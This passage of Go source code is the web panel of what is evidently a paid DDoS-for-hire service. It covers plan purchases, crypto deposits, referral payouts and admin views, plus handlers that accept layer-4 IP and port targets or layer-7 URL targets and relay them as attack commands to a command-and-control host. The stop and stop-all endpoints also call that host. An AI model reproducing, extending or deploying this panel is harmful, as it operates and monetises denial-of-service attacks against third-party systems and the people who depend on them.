	if err := tx.QueryRow("SELECT count(*) FROM plans WHERE name = ?", p.Name).Scan(&count); err != nil {
		http.Redirect(w, r, "/market?err=db", http.StatusFound)
		return
	}
	if count == 0 {
		if _, err := tx.Exec("INSERT INTO plans (name, concurrents, max_time, vip, api) VALUES (?, ?, ?, ?, ?)", p.Name, p.Concurrents, p.Time, p.VIP, p.APIAccess); err != nil {
			http.Redirect(w, r, "/market?err=db", http.StatusFound)
			return
		}
	}

	if err := tx.Commit(); err != nil {
		http.Redirect(w, r, "/market?err=db", http.StatusFound)
		return
	}
	LogActivity(r, ActivityLogEntry{
		ActorType: actorTypeUser,
		ActorID:   getUserIDByUsername(username),
		Username:  username,
		Action:    "PURCHASE_SUCCESS",
		Severity:  severityInfo,
		Message:   "Purchase completed successfully.",
		ResourceIDs: map[string]string{
			"product_id": strconv.Itoa(id),
		},
		Metadata: map[string]interface{}{
			"plan":  p.Name,
			"price": p.Price,
		},
	})
	http.Redirect(w, r, "/dashboard?msg=plan_activated", http.StatusFound)
}

func handleAdminPage(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	username, ok := validateSession(r)
	if !ok || username != "admin" {
		http.Redirect(w, r, "/dashboard", 302)
		return
	}
	csrfToken := ensureCSRFCookie(w, r)

	view := r.URL.Query().Get("view")
	if view == "" {
		view = "overview"
	}

	ad := AdminData{Username: "Admin", Uptime: getUptime(), CurrentView: view, RPS: int(atomic.LoadUint64(&currentRPS)), CsrfToken: csrfToken}
	_, walletKeyOK := walletEncryptionKey()
	ad.WalletEncryptionAvailable = walletKeyOK
	ad.WalletEncryptionEnv = walletKeyEnvName
	db.QueryRow("SELECT count(*) FROM users").Scan(&ad.TotalUsers)
	ad.RunningAttacks = len(activeAttacks)

	switch view {
	case "overview":
		rows, _ := db.Query("SELECT id, user_id, amount, usd_amount, status, date FROM deposits WHERE status='Pending' ORDER BY date DESC LIMIT 5")
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var d Deposit
				rows.Scan(&d.ID, &d.UserID, &d.Amount, &d.UsdAmount, &d.Status, &d.Date)
				d.Status = normalizeDepositStatus(d.Status)
				ad.Deposits = append(ad.Deposits, d)
			}
		}
		rows, _ = db.Query("SELECT id, name, price, time, concurrents, vip, api_access FROM products")
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var p Product
				rows.Scan(&p.ID, &p.Name, &p.Price, &p.Time, &p.Concurrents, &p.VIP, &p.APIAccess)
				ad.Products = append(ad.Products, p)
			}
		}
		ad.PlanConfigs = make(map[string]PlanConfig)
		pRows, _ := db.Query("SELECT name FROM plans")
		if pRows != nil {
			defer pRows.Close()
			for pRows.Next() {
				var n string
				pRows.Scan(&n)
				ad.PlanConfigs[n] = PlanConfig{}
			}
		}

	case "users":
		rows, _ := db.Query("SELECT username, plan, status, balance, api_token FROM users ORDER BY balance DESC LIMIT 100")
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var u User
				rows.Scan(&u.Username, &u.Plan, &u.Status, &u.Balance, &u.ApiToken)
				ad.Users = append(ad.Users, u)
			}
		}

	case "finance":
		rows, _ := db.Query("SELECT id, user_id, amount, usd_amount, status, date, address FROM deposits ORDER BY date DESC LIMIT 50")
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var d Deposit
				rows.Scan(&d.ID, &d.UserID, &d.Amount, &d.UsdAmount, &d.Status, &d.Date, &d.Address)
				d.Status = normalizeDepositStatus(d.Status)
				ad.Deposits = append(ad.Deposits, d)
			}
		}
		rows, _ = db.Query("SELECT address, status, assigned_to FROM wallets")
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var w Wallet
				rows.Scan(&w.Address, &w.Status, &w.AssignedTo)
				ad.Wallets = append(ad.Wallets, w)
			}
		}

	case "attacks":
		mu.Lock()
		for _, v := range activeAttacks {
			ad.ActiveAttacksList = append(ad.ActiveAttacksList, v)
		}
		mu.Unlock()

	case "market":
		rows, _ := db.Query("SELECT id, name, price, time, concurrents, vip, api_access FROM products")
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var p Product
				rows.Scan(&p.ID, &p.Name, &p.Price, &p.Time, &p.Concurrents, &p.VIP, &p.APIAccess)
				ad.Products = append(ad.Products, p)
			}
		}

	case "tickets":
		rows, _ := db.Query("SELECT id, user_id, category, subject, status, last_update FROM tickets ORDER BY last_update DESC")
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var t Ticket
				rows.Scan(&t.ID, &t.UserID, &t.Category, &t.Subject, &t.Status, &t.LastUpdate)
				ad.Tickets = append(ad.Tickets, t)
			}
		}
		if tid := r.URL.Query().Get("ticket"); tid != "" {
			var msgJSON string
			db.QueryRow("SELECT messages, user_id, category, subject, status FROM tickets WHERE id=?", tid).Scan(&msgJSON, &ad.CurrentTicket.UserID, &ad.CurrentTicket.Category, &ad.CurrentTicket.Subject, &ad.CurrentTicket.Status)
			ad.CurrentTicket.ID = tid
			json.Unmarshal([]byte(msgJSON), &ad.CurrentTicket.Messages)
		}

	case "settings":
		ad.PlanConfigs = make(map[string]PlanConfig)
		rows, _ := db.Query("SELECT name, concurrents, max_time, vip, api FROM plans")
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var name string
				var p PlanConfig
				rows.Scan(&name, &p.Concurrents, &p.MaxTime, &p.VIP, &p.API)
				ad.PlanConfigs[name] = p
			}
		}

	case "blacklist":
		rows, _ := db.Query("SELECT target, reason, date FROM blacklist")
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var b BlacklistEntry
				rows.Scan(&b.Target, &b.Reason, &b.Date)
				ad.Blacklist = append(ad.Blacklist, b)
			}
		}
	}

	renderTemplate(w, "admin.html", ad)
}

func handlePanelAttack(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")

	ip := getIP(r)
	if isRateLimited(ip) {
		logRateLimit(r, ip, "")
		writeJSONError(w, http.StatusTooManyRequests, "rate_limited", "Too many requests.")
		return
	}
	username, ok := validateSession(r)
	if !ok {
		writeJSONError(w, http.StatusUnauthorized, "unauthorized", "Authentication required.")
		return
	}
	if r.Method != http.MethodPost {
		writeJSONError(w, http.StatusMethodNotAllowed, "method_not_allowed", "Method not allowed.")
		return
	}
	if !validateCSRF(r) {
		writeJSONError(w, http.StatusForbidden, "csrf", "CSRF validation failed.")
		return
	}

	r.Body = http.MaxBytesReader(w, r.Body, maxBodySize)
	var d ApiReq
	if err := json.NewDecoder(r.Body).Decode(&d); err != nil {
		if isRequestBodyTooLarge(err) {
			writeJSONError(w, http.StatusRequestEntityTooLarge, "payload_too_large", "Request body too large.")
			return
		}
		writeJSONError(w, http.StatusBadRequest, "bad_request", "Invalid request payload.")
		return
	}

	d.Target = strings.TrimSpace(Sanitize(d.Target))
	d.Method = strings.TrimSpace(d.Method)
	d.Port = strings.TrimSpace(d.Port)
	d.Time = strings.TrimSpace(d.Time)
	d.Concurrency = strings.TrimSpace(d.Concurrency)
	d.Layer = strings.ToLower(strings.TrimSpace(d.Layer))

	var u User
	_ = db.QueryRow("SELECT plan FROM users WHERE username=?", username).Scan(&u.Plan)
	u.Plan = effectivePlanName(u.Plan)
	limits := getPlanConfig(u.Plan)
	reqTime, err := strconv.Atoi(d.Time)
	if err != nil || reqTime <= 0 {
		writeJSONError(w, http.StatusBadRequest, "invalid_time", "Invalid duration.")
		return
	}
	reqConc, err := strconv.Atoi(d.Concurrency)
	if err != nil || reqConc <= 0 {
		writeJSONError(w, http.StatusBadRequest, "invalid_concurrency", "Invalid concurrency.")
		return
	}
	if reqTime > limits.MaxTime {
		writeJSONError(w, http.StatusForbidden, "time_limit", "Duration exceeds plan limit.")
		return
	}
	if reqConc > limits.Concurrents {
		writeJSONError(w, http.StatusForbidden, "concurrency_limit", "Concurrency exceeds plan limit.")
		return
	}
	if d.Target == "" {
		writeJSONError(w, http.StatusBadRequest, "target_required", "Target is required.")
		return
	}
	if isBlacklisted(d.Target) {
		logBlacklistReject(r, ip, username, d.Target)
		writeJSONError(w, http.StatusForbidden, "target_blacklisted", "Target is blacklisted.")
		return
	}

	// Validate method against admin-managed methods and ensure layer matches.
	var cmd string
	var dbLayer string
	if err := db.QueryRow("SELECT layer, command FROM methods WHERE name=? AND enabled=1", d.Method).Scan(&dbLayer, &cmd); err != nil {
		writeJSONError(w, http.StatusBadRequest, "invalid_method", "Selected method is not available.")
		return
	}
	layer := strings.ToLower(strings.TrimSpace(d.Layer))
	dbLayer = strings.ToLower(strings.TrimSpace(dbLayer))
	if layer == "" {
		layer = dbLayer
	}
	if layer != "layer4" && layer != "layer7" {
		writeJSONError(w, http.StatusBadRequest, "invalid_layer", "Layer is required.")
		return
	}
	if dbLayer != layer {
		writeJSONError(w, http.StatusBadRequest, "invalid_method", "Selected method is not available for this layer.")
		return
	}

	id := launchAttack(username, d.Target, d.Port, d.Time, cmd, d.Concurrency)
	json.NewEncoder(w).Encode(map[string]any{"status": "ok", "id": id})
}

func launchAttack(user, target, port, duration, method, concurrency string) string {
	id := generateID()
	go func() {
		client := &http.Client{Timeout: 10 * time.Second}
		client.Get(fmt.Sprintf("%s/c2/admin/issue_command?token=%s&command_str=%s&concurrency=%s", cfg.C2Host, cfg.C2Key, method+" "+target+" "+port+" "+duration, concurrency))
	}()
	dur, _ := strconv.Atoi(duration)
	mu.Lock()
	activeAttacks[id] = AttackData{ID: id, UserID: user, Target: target, Method: method, Port: port, Duration: dur, StartTime: time.Now(), EndTime: time.Now().Add(time.Duration(dur) * time.Second)}
	mu.Unlock()
	return id
}

func loadMethodsFromDB() (map[string][]string, string) {
	methods = map[string][]string{"layer4": {}, "layer7": {}}
	mRows, _ := db.Query("SELECT name, layer FROM methods WHERE enabled=1 ORDER BY layer, name")
	if mRows != nil {
		defer mRows.Close()
		for mRows.Next() {
			var name, layer string
			_ = mRows.Scan(&name, &layer)
			layer = strings.ToLower(strings.TrimSpace(layer))
			switch layer {
			case "layer4", "layer7":
				methods[layer] = append(methods[layer], name)
			}
		}
	}
	mBytes, _ := json.Marshal(methods)
	return methods, string(mBytes)
}

func usernameInitials(name string) string {
	if name == "" {
		return "?"
	}
	if len(name) == 1 {
		return strings.ToUpper(name)
	}
	return strings.ToUpper(name[:2])
}

func panelFlashMessage(r *http.Request) (string, string) {
	if r == nil {
		return "", ""
	}
	switch r.URL.Query().Get("msg") {
	case "attack_sent":
		return "Attack request queued successfully.", "success"
	case "attack_failed":
		return "Unable to queue the attack. Please try again.", "error"
	default:
		return "", ""
	}
}

func flashMessageFromQuery(r *http.Request) (string, string) {
	if r == nil {
		return "", ""
	}
	q := r.URL.Query()
	if msg := q.Get("msg"); msg != "" {
		switch msg {
		case "success", "plan_activated":
			return "Plan activated successfully.", "success"
		case "deposit_created":
			return "Deposit invoice created. Follow the payment instructions below.", "success"
		case "deposit_exists":
			return "You already have a pending deposit. Continue from the existing invoice.", "info"
		case "ticket_created":
			return "Support ticket created. We will respond as soon as possible.", "success"
		case "ticket_reply":
			return "Your reply was sent to support.", "success"
		}
	}
	if err := q.Get("err"); err != "" {
		switch err {
		case "invalid", "1":
			return "Invalid username or password.", "error"
		case "rate_limit":
			return "Too many attempts. Please wait a moment and try again.", "error"
		case "session":
			return "Session could not be created. Please try again.", "error"
		case "csrf":
			return "Security token expired. Please retry the form.", "error"
		case "invalid_code":
			return "Invalid redeem code. Please check and try again.", "error"
		case "code_used":
			return "That redeem code has already been used.", "error"
		case "invalid_token":
			return "Invalid API token. Please check and try again.", "error"
		case "taken":
			return "That username is already taken.", "error"
		case "bad_ref":
			return "Referral code could not be verified.", "error"
		case "captcha_wrong":
			return "Captcha verification failed. Please try again.", "error"
		case "min":
			return "Minimum deposit amount is $1.00.", "error"
		case "balance":
			return "Insufficient balance. Add funds to continue.", "error"
		case "wallets":
			return "Deposits are temporarily unavailable. Please contact support.", "error"
		case "prod":
			return "The selected plan could not be found.", "error"
		case "user":
			return "We could not load your account. Please retry.", "error"
		case "db":
			return "Something went wrong. Please try again shortly.", "error"
		case "duplicate":
			return "This request was already processed.", "info"
		}
	}
	return "", ""
}

func handlePage(pName string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		setSecurityHeaders(w)
		username, ok := validateSession(r)
		if !ok {
			http.Redirect(w, r, "/login", 302)
			return
		}
		csrfToken := ensureCSRFCookie(w, r)
		var u User
		err := db.QueryRow("SELECT username, plan, status, api_token, user_id, balance, ref_code, ref_earnings, referred_by FROM users WHERE username=?", username).Scan(&u.Username, &u.Plan, &u.Status, &u.ApiToken, &u.UserID, &u.Balance, &u.RefCode, &u.RefEarnings, &u.ReferredBy)
		if err != nil {
			http.Redirect(w, r, "/logout", 302)
			return
		}
		if strings.TrimSpace(u.Plan) == "" {
			u.Plan = "Free"
			_, _ = db.Exec("UPDATE users SET plan='Free' WHERE username=?", u.Username)
		}
		u.Plan = effectivePlanName(u.Plan)

		var refCount int
		db.QueryRow("SELECT count(*) FROM users WHERE referred_by=?", u.Username).Scan(&refCount)
		refEarnings := getReferralEarnings(u.Username)
		var products []Product
		rows, _ := db.Query("SELECT id, name, price, time, concurrents, vip, api_access FROM products")
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var p Product
				rows.Scan(&p.ID, &p.Name, &p.Price, &p.Time, &p.Concurrents, &p.VIP, &p.APIAccess)
				products = append(products, p)
			}
		}
		var deposits []Deposit
		rows, _ = db.Query("SELECT id, amount, usd_amount, status, date, address FROM deposits WHERE user_id=? ORDER BY date DESC", u.Username)
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var d Deposit
				rows.Scan(&d.ID, &d.Amount, &d.UsdAmount, &d.Status, &d.Date, &d.Address)
				d.Status = normalizeDepositStatus(d.Status)
				deposits = append(deposits, d)
			}
		}
		var myTickets []Ticket
		activeTicket := Ticket{}
		viewID := r.URL.Query().Get("ticket")
		rows, _ = db.Query("SELECT id, user_id, category, subject, status, last_update, messages FROM tickets WHERE user_id = ? ORDER BY last_update DESC", u.Username)
		if rows != nil {
			defer rows.Close()
			for rows.Next() {
				var t Ticket
				var msgJSON string
				rows.Scan(&t.ID, &t.UserID, &t.Category, &t.Subject, &t.Status, &t.LastUpdate, &msgJSON)
				json.Unmarshal([]byte(msgJSON), &t.Messages)
				myTickets = append(myTickets, t)
				if t.ID == viewID {
					activeTicket = t
				}
			}
		}
		// Load methods from DB so panel matches admin configuration
		methodsMap, mBytes := loadMethodsFromDB()
		limits := getPlanConfig(u.Plan)
		freePlan := getPlanConfig("Free")
		flashMessage, flashType := panelFlashMessage(r)
		if flashMessage == "" {
			flashMessage, flashType = flashMessageFromQuery(r)
		}
		pd := PageData{
			Username:         u.Username,
			UserPlan:         u.Plan,
			UserBalance:      u.Balance,
			CurrentPage:      strings.TrimSuffix(pName, ".html"),
			Products:         products,
			Deposits:         deposits,
			Tickets:          myTickets,
			CurrentTicket:    activeTicket,
			MethodsJSON:      mBytes,
			Methods:          methodsMap,
			RefCode:          u.RefCode,
			ReferredBy:       u.ReferredBy,
			RefEarnings:      refEarnings,
			UsernameInitials: usernameInitials(u.Username),
			ApiToken:         u.ApiToken,
			RefCount:         refCount,
			MaxTime:          limits.MaxTime,
			MaxConcurrents:   limits.Concurrents,
			IsAdmin:          (u.Username == "admin"),
			CsrfToken:        csrfToken,
			FlashMessage:     flashMessage,
			FlashType:        flashType,
			RequestID:        generateToken(),
			FreePlan:         freePlan,
		}
		renderTemplate(w, pName, pd)
	}
}

func handleStatusPage(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	username, ok := validateSession(r)
	if !ok {
		http.Redirect(w, r, "/login", 302)
		return
	}
	var u User
	err := db.QueryRow("SELECT username, plan, balance, api_token FROM users WHERE username=?", username).
		Scan(&u.Username, &u.Plan, &u.Balance, &u.ApiToken)
	if err != nil {
		http.Redirect(w, r, "/logout", 302)
		return
	}
	uptime := formatUptime(time.Since(startTime))
	renderTemplate(w, "status.html", PageData{
		Username:         u.Username,
		UserPlan:         effectivePlanName(u.Plan),
		UserBalance:      u.Balance,
		CurrentPage:      "status",
		UsernameInitials: usernameInitials(u.Username),
		ApiToken:         u.ApiToken,
		Uptime:           uptime,
	})
}

func buildPanelFormData(username, csrfToken string) (PageData, error) {
	var u User
	if err := db.QueryRow("SELECT username, plan, balance, api_token FROM users WHERE username=?", username).
		Scan(&u.Username, &u.Plan, &u.Balance, &u.ApiToken); err != nil {
		return PageData{}, err
	}
	if strings.TrimSpace(u.Plan) == "" {
		u.Plan = "Free"
		_, _ = db.Exec("UPDATE users SET plan='Free' WHERE username=?", u.Username)
	}
	u.Plan = effectivePlanName(u.Plan)
	methodsMap, _ := loadMethodsFromDB()
	limits := getPlanConfig(u.Plan)
	return PageData{
		Username:         u.Username,
		UserPlan:         u.Plan,
		UserBalance:      u.Balance,
		CurrentPage:      "panel",
		Methods:          methodsMap,
		MaxTime:          limits.MaxTime,
		MaxConcurrents:   limits.Concurrents,
		UsernameInitials: usernameInitials(u.Username),
		ApiToken:         u.ApiToken,
		CsrfToken:        csrfToken,
	}, nil
}

func methodCommand(name, layer string) (string, error) {
	var cmd string
	err := db.QueryRow("SELECT command FROM methods WHERE name=? AND layer=? AND enabled=1", name, layer).Scan(&cmd)
	return cmd, err
}

func handlePanelL4Page(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	username, ok := validateSession(r)
	if !ok {
		http.Redirect(w, r, "/login", 302)
		return
	}
	if r.Method != http.MethodGet {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	csrfToken := ensureCSRFCookie(w, r)
	pd, err := buildPanelFormData(username, csrfToken)
	if err != nil {
		http.Redirect(w, r, "/logout", 302)
		return
	}
	pd.FormValues = map[string]string{
		"target":      "",
		"port":        "80",
		"time":        "60",
		"concurrency": "1",
	}
	renderTemplate(w, "panel_l4.html", pd)
}

func handlePanelL7Page(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	username, ok := validateSession(r)
	if !ok {
		http.Redirect(w, r, "/login", 302)
		return
	}
	if r.Method != http.MethodGet {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	csrfToken := ensureCSRFCookie(w, r)
	pd, err := buildPanelFormData(username, csrfToken)
	if err != nil {
		http.Redirect(w, r, "/logout", 302)
		return
	}
	pd.FormValues = map[string]string{
		"target":      "",
		"time":        "60",
		"concurrency": "1",
	}
	renderTemplate(w, "panel_l7.html", pd)
}

func handlePanelL4Submit(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	ip := getIP(r)
	if isRateLimited(ip) {
		logRateLimit(r, ip, "")
		http.Error(w, "Rate Limit", http.StatusTooManyRequests)
		return
	}
	username, ok := validateSession(r)
	if !ok {
		http.Redirect(w, r, "/login", 302)
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if r.ContentLength > maxBodySize {
		http.Error(w, "Request Entity Too Large", http.StatusRequestEntityTooLarge)
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, maxBodySize)
	if err := r.ParseForm(); err != nil {
		if isRequestBodyTooLarge(err) {
			http.Error(w, "Request Entity Too Large", http.StatusRequestEntityTooLarge)
			return
		}
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	csrfToken := ensureCSRFCookie(w, r)
	pd, err := buildPanelFormData(username, csrfToken)
	if err != nil {
		http.Redirect(w, r, "/logout", 302)
		return
	}

	target := strings.TrimSpace(r.FormValue("target"))
	methodName := strings.TrimSpace(r.FormValue("method"))
	portRaw := strings.TrimSpace(r.FormValue("port"))
	timeRaw := strings.TrimSpace(r.FormValue("time"))
	concRaw := strings.TrimSpace(r.FormValue("concurrency"))

	pd.FormValues = map[string]string{
		"target":      target,
		"method":      methodName,
		"port":        portRaw,
		"time":        timeRaw,
		"concurrency": concRaw,
	}

	fieldErrors := make(map[string]string)
	if target == "" {
		fieldErrors["target"] = "IP address is required."
	} else if ip := net.ParseIP(target); ip == nil || ip.To4() == nil {
		fieldErrors["target"] = "Enter a valid IPv4 address."
	}

	port, err := strconv.Atoi(portRaw)
	if err != nil || port < 1 || port > 65535 {
		fieldErrors["port"] = "Port must be between 1 and 65535."
	}

	reqTime, err := strconv.Atoi(timeRaw)
	if err != nil || reqTime <= 0 {
		fieldErrors["time"] = "Duration must be a positive number."
	} else if pd.MaxTime > 0 && reqTime > pd.MaxTime {
		fieldErrors["time"] = fmt.Sprintf("Duration exceeds your plan limit (%ds).", pd.MaxTime)
	}

	reqConc, err := strconv.Atoi(concRaw)
	if err != nil || reqConc <= 0 {
		fieldErrors["concurrency"] = "Concurrency must be a positive number."
	} else if pd.MaxConcurrents > 0 && reqConc > pd.MaxConcurrents {
		fieldErrors["concurrency"] = fmt.Sprintf("Concurrency exceeds your plan limit (%d).", pd.MaxConcurrents)
	}

	if methodName == "" {
		fieldErrors["method"] = "Select a valid method."
	}

	if isBlacklisted(target) {
		logBlacklistReject(r, ip, username, target)
		fieldErrors["target"] = "Target is blacklisted."
	}

	cmd, err := methodCommand(methodName, "layer4")
	if err != nil {
		fieldErrors["method"] = "Selected method is not available."
	}

	if len(fieldErrors) > 0 {
		pd.FieldErrors = fieldErrors
		pd.FormError = "Please correct the highlighted fields and try again."
		w.WriteHeader(http.StatusBadRequest)
		renderTemplate(w, "panel_l4.html", pd)
		return
	}

	launchAttack(username, target, strconv.Itoa(port), strconv.Itoa(reqTime), cmd, strconv.Itoa(reqConc))
	http.Redirect(w, r, "/panel?msg=attack_sent", 302)
}

func handlePanelL7Submit(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	ip := getIP(r)
	if isRateLimited(ip) {
		logRateLimit(r, ip, "")
		http.Error(w, "Rate Limit", http.StatusTooManyRequests)
		return
	}
	username, ok := validateSession(r)
	if !ok {
		http.Redirect(w, r, "/login", 302)
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if r.ContentLength > maxBodySize {
		http.Error(w, "Request Entity Too Large", http.StatusRequestEntityTooLarge)
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, maxBodySize)
	if err := r.ParseForm(); err != nil {
		if isRequestBodyTooLarge(err) {
			http.Error(w, "Request Entity Too Large", http.StatusRequestEntityTooLarge)
			return
		}
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	csrfToken := ensureCSRFCookie(w, r)
	pd, err := buildPanelFormData(username, csrfToken)
	if err != nil {
		http.Redirect(w, r, "/logout", 302)
		return
	}

	target := strings.TrimSpace(r.FormValue("target"))
	methodName := strings.TrimSpace(r.FormValue("method"))
	timeRaw := strings.TrimSpace(r.FormValue("time"))
	concRaw := strings.TrimSpace(r.FormValue("concurrency"))

	pd.FormValues = map[string]string{
		"target":      target,
		"method":      methodName,
		"time":        timeRaw,
		"concurrency": concRaw,
	}

	fieldErrors := make(map[string]string)
	parsedURL, err := url.ParseRequestURI(target)
	if target == "" {
		fieldErrors["target"] = "Target URL is required."
	} else if err != nil || (parsedURL.Scheme != "http" && parsedURL.Scheme != "https") || parsedURL.Host == "" {
		fieldErrors["target"] = "Enter a valid http or https URL."
	}

	reqTime, err := strconv.Atoi(timeRaw)
	if err != nil || reqTime <= 0 {
		fieldErrors["time"] = "Duration must be a positive number."
	} else if pd.MaxTime > 0 && reqTime > pd.MaxTime {
		fieldErrors["time"] = fmt.Sprintf("Duration exceeds your plan limit (%ds).", pd.MaxTime)
	}

	reqConc, err := strconv.Atoi(concRaw)
	if err != nil || reqConc <= 0 {
		fieldErrors["concurrency"] = "Concurrency must be a positive number."
	} else if pd.MaxConcurrents > 0 && reqConc > pd.MaxConcurrents {
		fieldErrors["concurrency"] = fmt.Sprintf("Concurrency exceeds your plan limit (%d).", pd.MaxConcurrents)
	}

	if methodName == "" {
		fieldErrors["method"] = "Select a valid method."
	}

	host := ""
	if parsedURL != nil {
		host = parsedURL.Hostname()
	}
	if target != "" && (isBlacklisted(target) || (host != "" && isBlacklisted(host))) {
		logBlacklistReject(r, ip, username, target)
		fieldErrors["target"] = "Target is blacklisted."
	}

	cmd, err := methodCommand(methodName, "layer7")
	if err != nil {
		fieldErrors["method"] = "Selected method is not available."
	}

	if len(fieldErrors) > 0 {
		pd.FieldErrors = fieldErrors
		pd.FormError = "Please correct the highlighted fields and try again."
		w.WriteHeader(http.StatusBadRequest)
		renderTemplate(w, "panel_l7.html", pd)
		return
	}

	port := "80"
	if parsedURL != nil && parsedURL.Scheme == "https" {
		port = "443"
	}
	if parsedURL != nil && parsedURL.Port() != "" {
		port = parsedURL.Port()
	}

	launchAttack(username, target, port, strconv.Itoa(reqTime), cmd, strconv.Itoa(reqConc))
	http.Redirect(w, r, "/panel?msg=attack_sent", 302)
}

func handleLogout(w http.ResponseWriter, r *http.Request) {
	username, ok := validateSession(r)
	c, err := r.Cookie(sessionCookieName)
	if err == nil && c.Value != "" && ok {
		res, err := db.Exec("DELETE FROM sessions WHERE token=? AND username=?", c.Value, username)
		if err == nil {
			if rows, _ := res.RowsAffected(); rows == 0 {
				logLogoutMismatch(r, getIP(r), username)
			}
		}
	} else if err == nil && c.Value != "" && !ok {
		logLogoutMismatch(r, getIP(r), "")
	}
	setSessionCookie(w, r, "", -1)
	if ok {
		LogActivity(r, ActivityLogEntry{
			ActorType: actorTypeUser,
			ActorID:   getUserIDByUsername(username),
			Username:  username,
			Action:    "AUTH_LOGOUT",
			Severity:  severityInfo,
			Message:   "User logged out.",
		})
	}
	http.Redirect(w, r, "/", 302)
}

func apiList(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")

	username, ok := validateSession(r)
	if !ok {
		writeJSONError(w, http.StatusUnauthorized, "unauthorized", "Authentication required.")
		return
	}
	mu.Lock()
	defer mu.Unlock()
	var list []AttackData
	for _, v := range activeAttacks {
		if v.UserID == username {
			list = append(list, v)
		}
	}
	json.NewEncoder(w).Encode(list)
}

func apiStop(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")

	username, ok := validateSession(r)
	if !ok {
		writeJSONError(w, http.StatusUnauthorized, "unauthorized", "Authentication required.")
		return
	}
	if r.Method != http.MethodPost {
		writeJSONError(w, http.StatusMethodNotAllowed, "method_not_allowed", "Method not allowed.")
		return
	}
	if !validateCSRF(r) {
		writeJSONError(w, http.StatusForbidden, "csrf", "CSRF validation failed.")
		return
	}
	id := r.FormValue("id")
	if id == "" {
		writeJSONError(w, http.StatusBadRequest, "missing_id", "Missing id.")
		return
	}
	stopped := false
	mu.Lock()
	atk, exists := activeAttacks[id]
	if exists && atk.UserID == username {
		delete(activeAttacks, id)
		stopped = true
		go func() {
			client := &http.Client{Timeout: 10 * time.Second}
			_, _ = client.Get(fmt.Sprintf("%s/c2/admin/stop?token=%s&id=%s", cfg.C2Host, cfg.C2Key, id))
		}()
	}
	mu.Unlock()
	json.NewEncoder(w).Encode(map[string]any{"status": "ok", "stopped": stopped})
}

func apiStopAll(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")

	username, ok := validateSession(r)
	if !ok {
		writeJSONError(w, http.StatusUnauthorized, "unauthorized", "Authentication required.")
		return
	}
	if r.Method != http.MethodPost {
		writeJSONError(w, http.StatusMethodNotAllowed, "method_not_allowed", "Method not allowed.")
		return
	}
	if !validateCSRF(r) {
		writeJSONError(w, http.StatusForbidden, "csrf", "CSRF validation failed.")
		return
	}
	stopped := 0
	mu.Lock()
	if username == "admin" {
		for id := range activeAttacks {
			delete(activeAttacks, id)
			stopped++
		}
	} else {
		for id, atk := range activeAttacks {
			if atk.UserID == username {
				delete(activeAttacks, id)
				stopped++
			}
		}
	}
	mu.Unlock()
	if username == "admin" {
		go func() {
			client := &http.Client{Timeout: 10 * time.Second}
			_, _ = client.Get(fmt.Sprintf("%s/c2/admin/stop_all?token=%s", cfg.C2Host, cfg.C2Key))
		}()
	}
	json.NewEncoder(w).Encode(map[string]any{"status": "ok", "stopped": stopped})
}

func handleGenCode(w http.ResponseWriter, r *http.Request) {
	u, ok := validateSession(r)
	if !ok || u != "admin" {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if r.ContentLength > maxBodySize {
		http.Error(w, "Request Entity Too Large", http.StatusRequestEntityTooLarge)
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, maxBodySize)
	if err := r.ParseForm(); err != nil {
		if isRequestBodyTooLarge(err) {
			http.Error(w, "Request Entity Too Large", http.StatusRequestEntityTooLarge)
			return
		}
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	code := generateToken()[:12]
	plan := r.FormValue("plan")
	db.Exec("INSERT INTO redeem_codes VALUES (?, ?, 0)", code, plan)
	w.Write([]byte(code))
}

func handleConfigPlans(w http.ResponseWriter, r *http.Request) {
	u, ok := validateSession(r)
	if !ok || u != "admin" {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	_ = r.ParseForm()
	name := r.FormValue("name")
	if name != "" {
